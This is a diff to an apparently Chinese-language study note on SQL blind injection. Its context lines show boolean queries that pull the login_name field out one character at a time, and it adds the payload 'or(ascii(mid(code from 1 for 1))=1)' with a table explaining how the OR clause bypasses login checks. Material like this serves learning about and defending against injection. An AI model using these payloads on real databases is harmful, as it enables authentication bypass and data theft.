@@ -36,4 +36,19 @@ select * from aj_report.lesson_user where id=1 AND LENGTH((SELECT login_name FRO
 
 #获取lesson_user中表的login_name字段中第一个记录的第1个字符
 select * from lesson_user where id=1 AND SUBSTRING((SELECT login_name FROM lesson_user LIMIT 0,1),1,1)='1';
+
+
 ```
+
+```sql
+
+#盲注脚本
+or(ascii(mid(code from 1 for 1))=1)
+```
+
+| 组件                     | 含义                                                         |
+| ------------------------ | ------------------------------------------------------------ |
+| `mid(code from 1 for 1)` | 提取字段 `code` 的第1个字符                                  |
+| `ascii(...)`             | 将该字符转为ASCII码                                          |
+| `=1`                     | 判断是否等于1（即判断code字段的第一个字符的ASCII值是否为1）  |
+| `or (...)`               | 如果条件为真，则整体 `WHERE` 条件为真，从而绕过验证，成功登录或获取数据 |
